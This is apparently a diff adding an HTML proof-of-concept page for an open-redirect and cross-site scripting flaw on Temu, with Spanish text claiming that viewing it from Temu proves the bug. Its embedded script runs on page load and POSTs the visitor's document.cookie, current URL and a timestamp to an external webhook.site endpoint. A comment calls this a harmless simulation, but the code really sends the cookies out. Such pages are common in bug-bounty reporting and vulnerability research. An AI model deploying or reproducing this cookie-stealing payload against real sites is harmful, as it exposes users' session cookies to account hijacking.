@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PoC - Temu Open Redirect + XSS</title>
+</head>
+<body>
+  <h1>Temu Vuln Hunter PoC</h1>
+  <p>Si estás viendo esto desde Temu, la vulnerabilidad es real.</p>
+  <script>
+    // Simulación de exfiltración de cookies (evita hacer daño real)
+    fetch("https://webhook.site/32a0eb40-6f73-46d8-ae79-42f7535375e2", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        document_cookie: document.cookie,
+        location: window.location.href,
+        timestamp: new Date().toISOString()
+      })
+    });
+  </script>
+</body>
+</html>
+
+
